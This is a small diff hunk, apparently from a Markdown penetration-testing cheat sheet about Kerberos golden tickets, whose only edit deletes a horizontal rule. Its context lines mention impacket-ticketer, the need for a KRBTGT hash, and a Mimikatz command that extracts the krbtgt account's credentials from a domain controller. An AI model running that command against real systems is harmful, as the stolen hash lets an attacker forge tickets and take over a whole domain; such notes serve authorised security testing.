@@ -9,8 +9,6 @@ impacket-ticketer
 Requirements:
 * KRBTGT hash
 
----
-
 ## Get info - Mimikatz
 ```
 lsadump::lsa /inject /name:krbtgt
